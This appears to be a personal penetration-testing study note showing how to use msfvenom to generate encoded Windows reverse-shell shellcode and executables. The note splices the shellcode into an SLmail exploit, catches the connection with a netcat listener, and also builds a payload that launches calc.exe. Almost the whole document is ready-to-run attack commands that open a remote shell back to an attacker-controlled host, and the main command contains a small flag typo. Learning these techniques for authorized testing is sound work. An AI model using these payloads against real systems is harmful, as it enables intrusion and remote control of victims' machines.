# See that exploits you can create:
Start mfsconsole
```
msfconsole
```

View Payloads:
```
show payloads
```
# Create your exploit with msfvenom

This module is an extension of the slmail exploit in "Public Exploits" > "Finding Exploits"
```
msfvenom -p windows/shell_reverse_tcp LHOST=<KaliIP> LPORT=<listeningPort> EXITFUNV=thread -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
```
-p => the payload
LHOST => Your Kali listing host IP
LPORT => Listening port for Kali
-f => function
-a => architecture
--platform => Platform for the payload (e.g.: Windows)
-b => bad characters
-e => Encoding

Example output:
![[Pasted image 20260429063237.png]]

The bytes you can copy into your modified exploit, in this example slmal:
Replace the current payload of SC with the new one
![[Pasted image 20260429063352.png]]

Start the listener on your device:
 ```
 nc -nlvp 1234
 ```
Execute the exploit:
```
python exploit.py
```

You should see the reverse shell on the terminal where you started the listener

# Make the exploit and executable:
```
msfvenom -p windows/shell_reverse_tcp LHOST=<KaliIP> LPORT=<listeningPort> EXITFUNV=thread -f exe -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai > /var/www/html/reverseShell.exe
```
Start your listener again
```
nc -nlvp 1234
```

Run the executable on the target
```
reverseShell.exe
```

You should receive a reverse shell now

# Let the exploit open/execute another app
```
msfvenom -p windows/exec cmd=calc.exe -f exe -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai > /var/www/html/reverseShell.exe
```

